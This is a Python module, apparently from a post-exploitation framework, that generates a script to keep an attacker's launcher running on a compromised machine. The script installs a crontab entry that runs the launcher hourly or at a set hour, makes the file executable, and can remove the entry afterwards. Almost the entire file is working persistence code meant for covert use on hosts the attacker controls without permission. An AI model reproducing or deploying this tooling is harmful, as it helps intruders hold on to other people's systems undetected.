class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Persistence with crontab',
            'Author': ['@424f424f'],
            'Description': 'This module establishes persistence via crontab',
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ['']
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to grab a screenshot from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Remove' : {
                'Description'   :   'Remove Persistence. True/False',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hourly' : {
                'Description'   :   'Hourly persistence.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hour' : {
                'Description'   :   'Hour to callback. 24hr format.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'FileName' : {
                'Description'   :   'File name for the launcher.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        Remove = self.options['Remove']['Value']
        Hourly = self.options['Hourly']['Value']
        Hour = self.options['Hour']['Value']
        FileName = self.options['FileName']['Value']
        script = """
import subprocess
import sys
Remove = "%s"
Hourly = "%s"
Hour = "%s"
if Remove == "True":
    cmd = 'crontab -l | grep -v "%s"  | crontab -'
    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
    print "Finished"
else:
    if Hourly == "True":
        cmd = 'crontab -l | { cat; echo "0 * * * * %s"; } | crontab -'
        print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
        print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
        print subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read()
        print "Finished"
    elif Hour:
            cmd = 'crontab -l | { cat; echo "0 %s * * * %s"; } | crontab -'
            print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
            print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
            print subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read()
            print "Finished"
""" % (Remove, Hourly, Hour, FileName, FileName, FileName, Hour, FileName, FileName)
        return script